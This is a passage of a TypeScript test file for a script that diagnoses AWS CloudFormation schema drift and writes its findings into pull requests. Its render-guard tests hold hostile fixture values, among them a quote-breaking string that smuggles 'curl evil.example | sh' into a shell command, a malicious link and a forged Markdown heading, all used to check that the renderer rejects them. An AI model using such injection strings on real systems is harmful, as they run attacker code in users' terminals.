/**
 * The refresh pull request's own diagnosis — `scripts/diagnose-schema-refresh.mjs`.
 *
 * The job opens a PR that may be RED by design, and before this script the PR
 * said only that such a class exists: finding out which property, on which
 * type, declared where, meant reading two checkers' CI output. All of that is
 * mechanical, so it is computed and written into the PR.
 *
 * The suite is shaped by the two ways this script can be WORSE than saying
 * nothing, both of which it did during development against real drift:
 *
 * 1. **A confident wrong answer.** Looking a property name up across every
 *    provider made `AWS::CodeCommit::Repository.Id` report evidence from
 *    `@aws-sdk/client-cloudfront`, because that file sorted first. Lookups are
 *    now scoped to the provider that actually serves the type.
 * 2. **A silent empty.** The declared-property parse missed `new Set<string>([`
 *    and returned nothing, which filtered every removal away and rendered
 *    "nothing needs a decision" over a PR that did. That parse now refuses to
 *    return an empty map for a non-empty module.
 *
 * Both are pinned below, and the real-repo cases are anchored on the actual
 * `register-providers.ts` and the actual generated coverage module, because a
 * synthetic fixture for either would encode the same assumption the parser
 * makes.
 */
import { describe, it, expect } from 'vite-plus/test';
import { readFileSync } from 'node:fs';
import { join, dirname } from 'node:path';
import { fileURLToPath } from 'node:url';
import {
  comparePropertySets,
  findDeclarationCandidates,
  mapTypesToProviderFiles,
  parseDeclaredProperties,
  pairRenames,
  NESTED_KEY_FAILURE_RE,
  parseNestedKeyDivergences,
  renderDetail,
  renderKey,
  renderLiteral,
  clientsForType,
  sdkClientVersions,
  renderDiagnosis,
  renderName,
  sdkModelsMember,
  sdkVersionLag,
} from '../../../scripts/diagnose-schema-refresh.mjs';

const REPO_ROOT = join(dirname(fileURLToPath(import.meta.url)), '..', '..', '..');

const fixture = (properties: string[], readOnly: string[] = []) =>
  JSON.stringify({
    resourceType: 'AWS::Test::Type',
    generatedAt: '2026-01-01',
    properties,
    readOnlyProperties: readOnly,
  });

describe('comparePropertySets', () => {
  it('separates removals, additions, and the writable subset of additions', () => {
    // The writable split is the load-bearing one: a read-only addition can
    // never be a dropped value, because there was nothing to send.
    const delta = comparePropertySets(
      fixture(['Keep', 'Gone']),
      fixture(['Keep', 'NewWritable', 'NewReadOnly'], ['NewReadOnly'])
    );
    expect(delta.removed).toEqual(['Gone']);
    expect(delta.added).toEqual(['NewWritable', 'NewReadOnly']);
    expect(delta.writableAdded).toEqual(['NewWritable']);
  });

  it('reports nothing for an unchanged type', () => {
    const delta = comparePropertySets(fixture(['A']), fixture(['A']));
    expect(delta).toEqual({ removed: [], added: [], writableAdded: [] });
  });
});

describe('parseNestedKeyDivergences', () => {
  it('captures the finding line FIELD BY FIELD, not as one opaque string', () => {
    // `nestedKey` reaches Markdown, and it comes from the un-checksummable
    // bundle by way of the fixtures — so it has to arrive as its own field for
    // the render guard to have anything to guard.
    const { divergences, unparsedFailure } = parseNestedKeyDivergences(
      [
        'nested-key-coverage: FAILED',
        '  AWS::Glue::Connection: OAuth2Credentials [definition-member-missing] (SDK interface `OAuth2Properties` has no member)',
        '  AWS::ECS::Service: someKey [case-divergence] (SDK models `SomeKey`)',
        'some unrelated trailing line',
      ].join('\n')
    );
    expect(unparsedFailure).toBe(false);
    expect(divergences).toHaveLength(2);
    expect(divergences[0]!.resourceType).toBe('AWS::Glue::Connection');
    expect(divergences[0]!.nestedKey).toBe('OAuth2Credentials');
    expect(divergences[0]!.bucket).toBe('definition-member-missing');
    expect(divergences[0]!.detail).toContain('has no member');
    expect(divergences[1]!.bucket).toBe('case-divergence');
    expect(divergences[1]!.nestedKey).toBe('someKey');
  });

  it('returns nothing, and no failure flag, for output with no findings', () => {
    expect(parseNestedKeyDivergences('nested-key-coverage: OK — 0 divergences')).toEqual({
      divergences: [],
      unparsedFailure: false,
    });
  });

  it('FLAGS a failure it could not read, in every mode the checker announces one', () => {
    // The checker's four FAIL verdicts and its crash path all legitimately
    // print no finding line this parser recognises. Throwing on them discarded
    // the whole diagnosis; returning a bare `[]` rendered "additions only" over
    // a red check. Both were shipped; the flag is the third answer.
    for (const failing of [
      'nested-key-coverage: FAIL — nested CFn->SDK key divergence(s) detected.',
      'nested-key-coverage: FAIL — stale NESTED_KEY_ALLOW_LIST entr(ies) match no audited key',
      'nested-key-coverage: FAIL — stale segmentRenames entr(ies) no longer resolve anything',
      'nested-key-coverage: FAIL — stale terminalRenames entr(ies): the un-renamed terminal',
      'nested-key-coverage: failed — Cannot find module',
    ]) {
      const out = parseNestedKeyDivergences(failing);
      expect(out.divergences).toEqual([]);
      expect(out.unparsedFailure, `did not flag: ${failing}`).toBe(true);
    }
  });

  it('does not flag a failure when it DID read findings out of one', () => {
    const out = parseNestedKeyDivergences(
      'nested-key-coverage: FAIL — nested CFn->SDK key divergence(s) detected.\n' +
        '  AWS::ECS::Service: someKey [case-divergence]\n'
    );
    expect(out.divergences).toHaveLength(1);
    expect(out.unparsedFailure).toBe(false);
  });

  it('pins its failure pattern against the checker that produces the text', () => {
    // Nothing else joins the two files. A reword in `gen-nested-key-coverage.ts`
    // would make the pattern inert, and an inert pattern renders a failing
    // check as "additions only" — the silent-clean verdict this job exists to
    // prevent.
    const producer = readFileSync(
      join(REPO_ROOT, 'scripts/gen-nested-key-coverage.ts'),
      'utf8'
    );
    const announcements = [...producer.matchAll(/nested-key-coverage: (?:FAIL|failed)/g)].map(
      (m) => m[0]
    );
    expect(announcements.length, 'the checker no longer announces failure this way').toBeGreaterThanOrEqual(5);
    for (const announcement of new Set(announcements)) {
      expect(NESTED_KEY_FAILURE_RE.test(announcement), `unmatched: ${announcement}`).toBe(true);
    }
  });
});

describe('parseDeclaredProperties', () => {
  const REAL_GENERATED = join(REPO_ROOT, 'src/provisioning/property-coverage.generated.ts');

  it('reads the REAL generated module, including its `new Set<string>([` shape', () => {
    // Anchored on the real module: a synthetic sample would be written to match
    // whatever the parser expects, which is exactly how the `<string>` type
    // argument was missed.
    const declared = parseDeclaredProperties(readFileSync(REAL_GENERATED, 'utf8'));
    // Compared against the module's OWN entry count, not a floor. A floor of
    // 100 was blind to the real defect: 131 of 134 parsed, three types silently
    // absent and two credited with a NEIGHBOUR's properties, because a type
    // whose set is `new Set<string>()` has no `[` for the lazy match to stop at.
    const entryCount = (readFileSync(REAL_GENERATED, 'utf8').match(/\[\s*'AWS::[\w:]+',\s*\{/g) ?? [])
      .length;
    expect(entryCount).toBeGreaterThan(100);
    expect(declared.size).toBe(entryCount);
    // The two types the partial parse mis-credited, pinned by name.
    expect(declared.get('AWS::CloudFormation::WaitConditionHandle')!.size).toBe(0);
    expect(declared.get('AWS::BedrockAgentCore::Evaluator')!.has('EvaluatorConfig')).toBe(true);
    const route53 = declared.get('AWS::Route53::RecordSet');
    expect(route53, 'AWS::Route53::RecordSet left the generated table').toBeDefined();
    expect(route53!.has('AliasTarget')).toBe(true);
  });

  it('REFUSES a non-empty module it parsed nothing from', () => {
    // The failure that shipped for one revision. An empty map here filters
    // every removal away and renders "nothing needs a decision" over a PR that
    // does — worse than crashing, because it reads as a clean report.
    expect(() => parseDeclaredProperties('export const X = 1;\n')).toThrow(
      /parsed to zero types/
    );
  });

  it('REFUSES a module whose declaration shape it no longer recognises', () => {
    // The guard that shipped compared `declared.size` against `boundaries.length`,
    // and `declared.set` runs once per boundary — so it could only ever fire on
    // a DUPLICATE type name. Measured against the real module: renaming the
    // member emptied all 134 sets with no refusal at all, which filters every
    // removal away and renders "nothing needs a decision" over a red check.
    const mutated = readFileSync(REAL_GENERATED, 'utf8').replaceAll('handled:', 'handledProps:');
    expect(() => parseDeclaredProperties(mutated)).toThrow(/recognised the declaration shape/);
  });

  it('accepts a type declaring NOTHING, which is not the same as an unread one', () => {
    // `new Set<string>()` has no `[`, so it matches neither the populated shape
    // nor a naive "did we extract names" test. Counting it as unrecognised
    // would refuse the real module outright.
    const declared = parseDeclaredProperties(readFileSync(REAL_GENERATED, 'utf8'));
    const empties = [...declared.values()].filter((set) => set.size === 0).length;
    expect(empties, 'no empty-set entry left — this case no longer covers that shape').toBeGreaterThan(0);
  });

  it('returns an empty map for genuinely empty input, without throwing', () => {
    expect(parseDeclaredProperties('').size).toBe(0);
  });
});

describe('mapTypesToProviderFiles', () => {
  const REAL_REGISTER = join(REPO_ROOT, 'src/provisioning/register-providers.ts');

  it('resolves both registration shapes against the REAL registration file', () => {
    const map = mapTypesToProviderFiles(readFileSync(REAL_REGISTER, 'utf8'));
    expect(map.size).toBeGreaterThan(100);
    // Registered from a shared local (`const route53Provider = new Route53Provider()`).
    expect(map.get('AWS::Route53::RecordSet')).toBe(
      'src/provisioning/providers/route53-provider.ts'
    );
    // Registered with a fresh instance inline.
    expect(map.get('AWS::CodeCommit::Repository')).toBe(
      'src/provisioning/providers/codecommit-repository-provider.ts'
    );
  });

  it('returns nothing for a source with no registrations', () => {
    expect(mapTypesToProviderFiles('export function registerAllProviders() {}').size).toBe(0);
  });
});

describe('findDeclarationCandidates', () => {
  it('is scoped to the provider serving the type, not the whole directory', () => {
    // The confident-wrong-answer case. Unscoped, `Id` matched 50+ lines across
    // 20 providers; scoped, it can only report the file that owns the type.
    // `AliasTarget`, not `GeoProximityLocation`: the latter is the property this
    // very refresh cycle removes, so following the runbook's own remedy would
    // red this test with a message about the diagnosis script rather than about
    // the classification.
    const hits = findDeclarationCandidates(
      'AliasTarget',
      'src/provisioning/providers/route53-provider.ts',
      'AWS::Route53::RecordSet',
      REPO_ROOT
    );
    expect(hits.length).toBeGreaterThan(0);
    for (const hit of hits) {
      expect(hit.startsWith('src/provisioning/providers/route53-provider.ts:')).toBe(true);
    }
  });

  it('returns nothing rather than guessing when the owning provider is unknown', () => {
    expect(findDeclarationCandidates('Whatever', undefined, undefined, REPO_ROOT)).toEqual([]);
  });

  it('scopes to the TYPE block inside a provider file serving several types', () => {
    // 17 provider files serve more than one type; `ec2-provider.ts` serves 15.
    // Unscoped, asking about `Tags` on one Glue type returned every `'Tags'` in
    // the file, including other Glue types' declarations.
    // The PROPERTY is what makes this discriminate, and two rounds picked one
    // that could not. `ConnectionInput` occurs only inside this type's own
    // block, so scoped, unscoped and file-wide were the same answer and BOTH
    // window bounds could be deleted with every case still green (measured).
    // `Name` occurs before the block, inside it, and after it, so deleting the
    // START bound and deleting the END bound each fail a different assertion
    // below.
    const type = 'AWS::Glue::Connection';
    const file = 'src/provisioning/providers/glue-provider.ts';
    const scoped = findDeclarationCandidates('Name', file, type, REPO_ROOT);
    const unscoped = findDeclarationCandidates('Name', file, undefined, REPO_ROOT);
    expect(scoped.length, 'the type block yielded nothing — scoping window is wrong').toBeGreaterThan(0);
    // Strictly wider, not merely no narrower: an equal count means the property
    // is confined to the block and the case cannot see a missing bound at all.
    expect(
      unscoped.length,
      'unscoped == scoped — this property cannot discriminate; pick one that occurs outside the block'
    ).toBeGreaterThan(scoped.length);
    // Every scoped hit must sit inside the block, i.e. at or after the type's
    // own literal — deleting the window's END makes this fail on a later type.
    const lines = readFileSync(join(REPO_ROOT, file), 'utf8').split('\n');
    const start = lines.findIndex((l) => l.includes(`'${type}'`));
    const nextType = lines.findIndex(
      (l, i) => i > start && /'AWS::[A-Za-z0-9]+::[A-Za-z0-9]+'/.test(l)
    );
    for (const hit of scoped) {
      const lineNo = Number(hit.split(':')[1]);
      expect(lineNo).toBeGreaterThan(start);
      if (nextType !== -1) expect(lineNo).toBeLessThanOrEqual(nextType);
    }
  });
});

describe('sdkModelsMember', () => {
  it('consults the client the OWNING provider imports', () => {
    const evidence = sdkModelsMember(
      'AliasTarget',
      'src/provisioning/providers/route53-provider.ts',
      REPO_ROOT
    );
    expect(evidence, 'no SDK client resolved for the Route53 provider').toBeDefined();
    // The whole point of deriving the client from the provider's own imports:
    // CFn spells it `Route53`, the SDK spells it `route-53`, and no
    // hand-maintained table is involved.
    expect(evidence!.client).toBe('@aws-sdk/client-route-53');
    expect(evidence!.modelled).toBe(true);
  });

  it('reports NOT modelled for a name no client carries', () => {
    const evidence = sdkModelsMember(
      'CdkdDefinitelyNotAnSdkMemberName',
      'src/provisioning/providers/route53-provider.ts',
      REPO_ROOT
    );
    expect(evidence!.modelled).toBe(false);
  });

  it('is CASE-INSENSITIVE — the defect that leaned toward deleting a live declaration', () => {
    // A real-repo anchor, not a synthetic one: `@aws-sdk/client-api-gateway`
    // spells the member `restApiId` and carries no PascalCase spelling anywhere
    // in its models. Case-sensitively, `RestApiId` came back `modelled: false`,
    // and the report then said both of AWS's descriptions had dropped it —
    // encouraging deletion of a property the API very much still takes.
    const evidence = sdkModelsMember(
      'RestApiId',
      'src/provisioning/providers/apigateway-provider.ts',
      REPO_ROOT
    );
    expect(evidence, 'no SDK client resolved for the API Gateway provider').toBeDefined();
    expect(evidence!.modelled).toBe(true);
  });

  it('consults EVERY imported client, not just the first', () => {
    // 14 provider files import 2-4 clients. Reading the first is only
    // coincidentally right today, and an import reformat would flip the
    // evidence to the wrong service silently — the first defect returning
    // through a side door.
    // A name present in NO client, so the scan cannot stop at the first —
    // `consulted` then records everything it actually looked at.
    const evidence = sdkModelsMember(
      'CdkdNoSuchMemberAnywhere',
      'src/provisioning/providers/lambda-function-provider.ts',
      REPO_ROOT
    );
    expect(evidence!.modelled).toBe(false);
    expect(evidence!.consulted!.length).toBeGreaterThan(1);
  });

  it('refuses a property name it would have to rewrite to search for', () => {
    // Scrubbing non-alphanumerics turns the needle into a different question.
    expect(
      sdkModelsMember('Foo.Bar', 'src/provisioning/providers/route53-provider.ts', REPO_ROOT)
    ).toBeUndefined();
  });

  it('answers undefined rather than guessing when the provider is unknown', () => {
    expect(sdkModelsMember('X', undefined, REPO_ROOT)).toBeUndefined();
  });
});

describe('sdkVersionLag', () => {
  it('settles the lag question in both directions', () => {
    // The one branch of the divergence decision that IS decidable: current
    // means the lag reading is eliminated, not merely unlikely.
    expect(sdkVersionLag('x', '3.1.0', () => '3.9.0\n')).toEqual({
      installed: '3.1.0',
      latest: '3.9.0',
      behind: true,
    });
    expect(sdkVersionLag('x', '3.9.0', () => '3.9.0\n')!.behind).toBe(false);
  });

  it('degrades to silence on a network failure or junk answer', () => {
    // A diagnosis must never fail the job it describes.
    expect(
      sdkVersionLag('x', '3.1.0', () => {
        throw new Error('offline');
      })
    ).toBeUndefined();
    expect(sdkVersionLag('x', '3.1.0', () => 'npm ERR! 404')).toBeUndefined();
    expect(sdkVersionLag('x', undefined, () => '3.9.0')).toBeUndefined();
  });
});

describe('pairRenames', () => {
  /**
   * The PAIRING is tested, not the renderer's reaction to a hand-fed result.
   * The earlier case passed `renameCandidates: []` into `renderDiagnosis` and
   * asserted no rename appeared — trivially true, and it left the actual rule
   * unpinned: reverting it to "every writable addition is a rename" kept all 37
   * cases green.
   */
  it('pairs a removal with a similarly-named addition', () => {
    expect(pairRenames('Id', ['RepositoryId'])).toEqual(['RepositoryId']);
    expect(pairRenames('GeoProximityLocation', ['GeoProximityLocationV2'])).toEqual([
      'GeoProximityLocationV2',
    ]);
  });

  it('does NOT pair an unrelated addition', () => {
    // The surviving mutation the old test could not see: unconditional pairing
    // told the maintainer that `Tags` and `Name` were `Id` renamed.
    expect(pairRenames('Id', ['Tags', 'Name', 'CapacityProviderConfiguration'])).toEqual([]);
  });

  it('pairs nothing when the refresh added nothing writable', () => {
    // Read-only additions never reach here — a declaration cannot target one.
    expect(pairRenames('Id', [])).toEqual([]);
  });
});

describe('renderName', () => {
  it('rejects a name carrying Markdown rather than rendering it', () => {
    // Property names come from an artifact this job documents as
    // TLS-trusted-only. A crafted key can close the backtick span and forge a
    // "nothing needs a decision" heading in the PR body and the umbrella issue
    // comment — attacking the human-review half of that accepted residual.
    expect(renderName('WarmUpConfiguration')).toBe('`WarmUpConfiguration`');
    const poisoned = renderName('Foo`\n\n## Nothing in this refresh needs a decision');
    expect(poisoned).not.toContain('##');
    expect(poisoned).toContain('rejected');
  });
});

describe('renderDiagnosis', () => {
  const removedEntry = {
    resourceType: 'AWS::Route53::RecordSet',
    properties: ['GeoProximityLocation'],
    candidates: { GeoProximityLocation: ['src/provisioning/providers/route53-provider.ts:274'] },
    sdk: {
      GeoProximityLocation: {
        client: '@aws-sdk/client-route-53',
        modelled: true,
        version: '3.1018.0',
      },
    },
  };

  it('names the property, the site, and which way the SDK evidence leans', () => {
    const md = renderDiagnosis({
      removed: [removedEntry],
      writableAdded: [],
      divergences: [],
      skipped: [],
    });
    expect(md).toContain('GeoProximityLocation');
    expect(md).toContain('route53-provider.ts:274');
    expect(md).toContain('@aws-sdk/client-route-53');
    expect(md).toContain('still models this name');
    expect(md).toContain('bogusTolerated');
    expect(md).toContain('3.1018.0');
  });

  it('leans the other way — and warns about renames — when the SDK dropped it too', () => {
    const md = renderDiagnosis({
      removed: [
        {
          ...removedEntry,
          sdk: { GeoProximityLocation: { client: '@aws-sdk/client-route-53', modelled: false } },
        },
      ],
      writableAdded: [],
      divergences: [],
      skipped: [],
    });
    expect(md).toContain('no longer models this name');
    expect(md).toContain('retiring the declaration');
    // A rename is indistinguishable here, and saying so is what keeps the
    // evidence from reading as a verdict.
    expect(md).toContain('rename would look identical');
  });

  it('says so plainly when no evidence could be gathered', () => {
    const md = renderDiagnosis({
      removed: [{ ...removedEntry, sdk: { GeoProximityLocation: undefined } }],
      writableAdded: [],
      divergences: [],
      skipped: [],
    });
    expect(md).toContain('SDK evidence: none');
  });

  it('flags a RENAME when the same refresh added a name to the same type', () => {
    // The single most decisive signal available, and it was missed at first:
    // a rename is a removal and an addition arriving TOGETHER, and both sides
    // are in hand. Measured on real drift, `AWS::CodeCommit::Repository`
    // dropped `Id` and gained `RepositoryId` in one cycle.
    const md = renderDiagnosis({
      removed: [
        {
          resourceType: 'AWS::CodeCommit::Repository',
          properties: ['Id'],
          candidates: { Id: ['src/provisioning/providers/codecommit-repository-provider.ts:10'] },
          sdk: { Id: { client: '@aws-sdk/client-codecommit', modelled: false, version: '3.0.0' } },
          renameCandidates: { Id: ['RepositoryId'] },
        },
      ],
      writableAdded: [
        { resourceType: 'AWS::CodeCommit::Repository', properties: ['RepositoryId'] },
      ],
      divergences: [],
      skipped: [],
    });
    expect(md).toContain('Possibly a RENAME');
    expect(md).toContain('RepositoryId');
  });

  it('does NOT call a READ-ONLY addition a rename, whatever the caller passed', () => {
    // A declaration cannot be pointed at a read-only property, so this advice
    // cannot be followed. The caller filters to writable additions and that
    // filter had NO pin: swapping its argument for the unfiltered list left
    // every case green. Re-checked in the renderer, where both sides are in
    // hand, the class is closed whatever the caller passes.
    const md = renderDiagnosis({
      removed: [
        {
          resourceType: 'AWS::CodeCommit::Repository',
          properties: ['Id'],
          candidates: { Id: ['src/provisioning/providers/codecommit-repository-provider.ts:10'] },
          renameCandidates: { Id: ['RepositoryId'] },
        },
      ],
      // `RepositoryId` arrived READ-ONLY: absent from writableAdded entirely.
      writableAdded: [],
      divergences: [],
      skipped: [],
    });
    expect(md).not.toContain('Possibly a RENAME');
    expect(md).not.toContain('RepositoryId');
  });

  it('does NOT claim a rename when the refresh added nothing to that type', () => {
    const md = renderDiagnosis({
      removed: [{ ...removedEntry, renameCandidates: { GeoProximityLocation: [] } }],
      writableAdded: [],
      divergences: [],
      skipped: [],
    });
    expect(md).not.toContain('a RENAME');
  });

  it('carries the installed SDK version, since "not modelled" is only as current as it', () => {
    const md = renderDiagnosis({
      removed: [removedEntry],
      writableAdded: [],
      divergences: [],
      skipped: [],
    });
    expect(md).toContain('3.1018.0');
  });

  it('gives paste-able steps for BOTH classes, not just a classification', () => {
    // A report that classifies without saying what to run has handed over a
    // question, not the work.
    const md = renderDiagnosis({
      removed: [removedEntry],
      writableAdded: [],
      divergences: [
        { resourceType: 'AWS::Glue::Connection', nestedKey: 'SomeKey', bucket: 'definition-member-missing', detail: '' },
      ],
      skipped: [],
    });
    expect(md).toContain('aws cloudformation describe-type');
    expect(md).toContain('vp test run property-coverage');
    // The SDK-lag check is the step that answers the one question the evidence
    // cannot; without it an allow-list entry can be added over a stale SDK.
    expect(md).toContain('npm view @aws-sdk/client-');
    expect(md).toContain('audit:nested-key-coverage:check');
  });

  it('says the lag reading is RULED OUT when the client is current', () => {
    const md = renderDiagnosis({
      removed: [],
      writableAdded: [],
      divergences: [
        { resourceType: 'AWS::Glue::Connection', nestedKey: 'SomeKey', bucket: 'no-sdk-member', detail: '' },
      ],
      skipped: [],
      sdkLag: [
        {
          client: '@aws-sdk/client-glue',
          resourceType: 'AWS::Glue::Connection',
          installed: '3.9.0',
          latest: '3.9.0',
          behind: false,
        },
      ],
    });
    expect(md).toContain('is current');
    expect(md).toContain('ruled out');
  });

  it('says the lag reading is LIVE, without claiming a bump would fix it', () => {
    // "Bumping would fix this" is not answerable by a name lookup — measured:
    // the live Glue divergence names ARE present in both the installed and the
    // latest client, because the checker's finding is interface-level.
    const md = renderDiagnosis({
      removed: [],
      writableAdded: [],
      divergences: [
        { resourceType: 'AWS::Glue::Connection', nestedKey: 'SomeKey', bucket: 'no-sdk-member', detail: '' },
      ],
      skipped: [],
      sdkLag: [
        {
          client: '@aws-sdk/client-glue',
          resourceType: 'AWS::Glue::Connection',
          installed: '3.1018.0',
          latest: '3.1127.0',
          behind: true,
        },
      ],
    });
    expect(md).toContain('3.1018.0');
    expect(md).toContain('3.1127.0');
    expect(md).toContain('LIVE');
    expect(md).not.toContain('would fix');
  });

  it('omits the SDK-lag step when every divergence is a case-divergence', () => {
    // There is no judgement in a case divergence — the SDK has the key under a
    // different capitalisation — so the lag question does not arise.
    const md = renderDiagnosis({
      removed: [],
      writableAdded: [],
      divergences: [
        { resourceType: 'AWS::ECS::Service', nestedKey: 'SomeKey', bucket: 'case-divergence', detail: '' },
      ],
      skipped: [],
    });
    expect(md).toContain('case-divergence` means the SDK models the key');
    expect(md).not.toContain('npm view');
  });

  it('names read-only additions as needing nothing, since the diff still shows them', () => {
    const md = renderDiagnosis({
      removed: [],
      writableAdded: [],
      readOnlyAddedCount: 6,
      divergences: [],
      skipped: [],
    });
    expect(md).toContain('Read-only properties AWS added (6)');
    expect(md).toContain('nothing to do');
  });

  it('reports an additions-only cycle as needing no decision', () => {
    const md = renderDiagnosis({
      removed: [],
      writableAdded: [{ resourceType: 'AWS::CloudWatch::Alarm', properties: ['WarmUpConfiguration'] }],
      divergences: [],
      skipped: [],
    });
    expect(md).toContain('Nothing in this refresh needs a decision');
    expect(md).toContain('WarmUpConfiguration');
    expect(md).toContain('no decision needed');
  });

  it('always closes by saying the decision is deliberately not made', () => {
    // Without this the report reads as a recommendation, which is exactly the
    // reading the asymmetry argument exists to prevent.
    for (const input of [
      { removed: [removedEntry], writableAdded: [], divergences: [], skipped: [] },
      { removed: [], writableAdded: [], divergences: [], skipped: [] },
    ]) {
      expect(renderDiagnosis(input)).toContain('deliberately not made here');
    }
  });

  it('renders every divergence field, and names both options', () => {
    const md = renderDiagnosis({
      removed: [],
      writableAdded: [],
      divergences: [
        {
          resourceType: 'AWS::Glue::Connection',
          nestedKey: 'OAuth2Properties.OAuth2Credentials',
          bucket: 'definition-member-missing',
          detail: 'SDK interface `OAuth2Properties` has no member',
        },
      ],
      skipped: [],
    });
    expect(md).toContain('AWS::Glue::Connection');
    expect(md).toContain('OAuth2Properties.OAuth2Credentials');
    expect(md).toContain('definition-member-missing');
    // The detail survives, minus the characters that could end the line early.
    expect(md).toContain('has no member');
    expect(md).toContain('NESTED_KEY_ALLOW_LIST');
    expect(md).toContain('installed');
  });

  it('lists types the public bundle does not carry', () => {
    const md = renderDiagnosis({
      removed: [],
      writableAdded: [],
      divergences: [],
      skipped: ['AWS::BedrockAgentCore::Browser'],
    });
    expect(md).toContain('AWS::BedrockAgentCore::Browser');
    expect(md).toContain('Not refreshed');
  });
});

describe('the render guards, at every site that reaches Markdown', () => {
  // The guard existed and was enforced at ONE of five call sites: reverting the
  // other four to raw interpolation left every case green. This drives one
  // diagnosis carrying a hostile name in EVERY name-bearing position and counts
  // the rejections, so a reverted site is a failing count rather than a case
  // nobody wrote.
  const POISON = 'Foo`\n\n## Nothing in this refresh needs a decision';

  it('rejects a hostile name in every position a bundle-derived name reaches', () => {
    const md = renderDiagnosis({
      removed: [
        {
          resourceType: 'AWS::Glue::Connection',
          properties: [POISON],
          candidates: { [POISON]: [] },
          renameCandidates: { [POISON]: [POISON] },
          providerPath: 'src/provisioning/providers/glue-provider.ts',
        },
      ],
      writableAdded: [{ resourceType: 'AWS::Glue::Connection', properties: [POISON] }],
      divergences: [
        {
          resourceType: 'AWS::Glue::Connection',
          nestedKey: POISON,
          bucket: 'no-sdk-member',
          detail: '',
        },
      ],
      skipped: [POISON],
    });
    // The removal bullet, the rename bullet, the writable-added bullet, the
    // divergence line and the skipped list: five sites, five rejections.
    const rejections = (md.match(/\[(?:name|key) rejected: unexpected characters\]/g) ?? []).length;
    expect(rejections, 'a call site is interpolating a bundle-derived name raw').toBe(5);
    // And the forged heading never renders as one.
    expect(md).not.toMatch(/^## Nothing in this refresh needs a decision$/m);
  });

  it('keeps a hostile name out of the paste-able shell command', () => {
    // These go inside single quotes in a bash block the runbook tells the
    // maintainer to paste, so a `'` is command injection in their own terminal
    // rather than a broken Markdown span.
    const md = renderDiagnosis({
      removed: [
        {
          resourceType: "AWS::X::Y'; curl evil.example | sh; echo '",
          properties: ["Name'; curl evil.example | sh; echo '"],
          candidates: {},
        },
      ],
      writableAdded: [],
      divergences: [],
      skipped: [],
    });
    expect(md).not.toContain('curl evil.example');
    expect(md).toContain('NAME_REJECTED_UNEXPECTED_CHARACTERS');
  });

  it('renderKey admits a real nested path and refuses a span-breaking one', () => {
    expect(renderKey('DistributionConfig.Origins.Items.CustomHeaders')).toBe(
      '`DistributionConfig.Origins.Items.CustomHeaders`'
    );
    expect(renderKey('#top')).toBe('`#top`');
    expect(renderKey('Foo`bar')).toContain('rejected');
    expect(renderKey('Foo [x](https://evil.example)')).toContain('rejected');
  });

  it('renderLiteral admits a real name and refuses a quote', () => {
    expect(renderLiteral('AWS::Glue::Connection')).toBe('AWS::Glue::Connection');
    expect(renderLiteral("a'b")).toBe('NAME_REJECTED_UNEXPECTED_CHARACTERS');
  });

  it('renderDetail strips what could end the line, and keeps the prose', () => {
    expect(renderDetail('SDK has `OAuth2Properties`, but the provider never writes it')).toBe(
      'SDK has OAuth2Properties, but the provider never writes it'
    );
    expect(renderDetail('x\n## Forged')).not.toContain('\n');
  });
});

describe('the unparsed-failure verdict', () => {
  it('never renders "additions only" over a checker that said it failed', () => {
    // Both wrong answers shipped: throwing discarded the whole diagnosis,
    // returning [] rendered the refresh as clean. The third answer is a section
    // naming what happened, and the clean verdict suppressed.
    const md = renderDiagnosis({
      removed: [],
      writableAdded: [{ resourceType: 'AWS::S3::Bucket', properties: ['NewThing'] }],
      divergences: [],
      nestedKeyUnparsed: true,
      skipped: [],
    });
    expect(md).not.toContain('additions only');
    expect(md).toContain('FAILED in a mode this report cannot read');
    expect(md).toContain('audit:nested-key-coverage:check');
    // The rest of the report is still rendered — that is the whole point of not
    // throwing.
    expect(md).toContain('NewThing');
  });

  it('renders the clean verdict when the checker did NOT fail', () => {
    const md = renderDiagnosis({
      removed: [],
      writableAdded: [],
      divergences: [],
      nestedKeyUnparsed: false,
      skipped: [],
    });
    expect(md).toContain('additions only');
  });
});

describe('sdkClientVersions', () => {
  it('pairs each client with ITS OWN installed version', () => {
    // The lag question has no member to look up, and asking `sdkModelsMember`
    // with a name that matches nothing answered with the provider's FIRST
    // import — right only by coincidence.
    const rows = sdkClientVersions(
      'src/provisioning/providers/route53-provider.ts',
      REPO_ROOT
    );
    expect(rows.length).toBeGreaterThan(0);
    for (const { client, version } of rows) {
      expect(client).toMatch(/^@aws-sdk\/client-/);
      const onDisk = JSON.parse(
        readFileSync(join(REPO_ROOT, 'node_modules', client, 'package.json'), 'utf8')
      ).version;
      expect(version, `${client} paired with another client's version`).toBe(onDisk);
    }
  });

  it('returns nothing rather than guessing when the provider is unknown', () => {
    expect(sdkClientVersions(undefined, REPO_ROOT)).toEqual([]);
  });
});

describe('the SDK-lag section', () => {
  const divergence = {
    resourceType: 'AWS::Glue::Connection',
    nestedKey: 'OAuth2Properties.X',
    bucket: 'no-sdk-member',
    detail: '',
  };

  it('scopes every lag row to the type it was computed for', () => {
    // A single line covering "the first divergent type" read as a verdict over
    // divergences it never looked at.
    const md = renderDiagnosis({
      removed: [],
      writableAdded: [],
      divergences: [divergence, { ...divergence, resourceType: 'AWS::ECS::Service' }],
      skipped: [],
      sdkLag: [
        {
          resourceType: 'AWS::Glue::Connection',
          client: '@aws-sdk/client-glue',
          installed: '3.9.0',
          latest: '3.9.0',
          behind: false,
        },
      ],
    });
    expect(md).toContain('AWS::Glue::Connection');
    expect(md).toContain('ruled out here');
    // The type with NO row must not read as covered by the one that has it.
    expect(md).toContain('UNKNOWN, not ruled out');
  });

  it('rejects a version string that is not one', () => {
    // The anchor is the whole guard: without `$`, `npm view` output carrying a
    // trailing line would be reported as the published version.
    expect(sdkVersionLag('@aws-sdk/client-glue', '3.9.0', () => '3.9.1')).toEqual({
      installed: '3.9.0',
      latest: '3.9.1',
      behind: true,
    });
    expect(sdkVersionLag('@aws-sdk/client-glue', '3.9.0', () => '3.9.1\nnpm WARN x')).toBeUndefined();
    expect(sdkVersionLag('@aws-sdk/client-glue', '3.9.0', () => 'not-a-version')).toBeUndefined();
  });
});

describe('clientsForType', () => {
  const rows = [
    { client: '@aws-sdk/client-sts', version: '3.0.0' },
    { client: '@aws-sdk/client-glue', version: '3.1.0' },
  ];

  it('drops the clients a provider imports that do not serve the type', () => {
    // Live-observed: a Glue key divergence reported `@aws-sdk/client-sts` as
    // lagging, which is true and says nothing about the finding. Most providers
    // import STS.
    expect(clientsForType('AWS::Glue::Connection', rows)).toEqual([
      { client: '@aws-sdk/client-glue', version: '3.1.0' },
    ]);
  });

  it('matches a service whose client name drops the separators', () => {
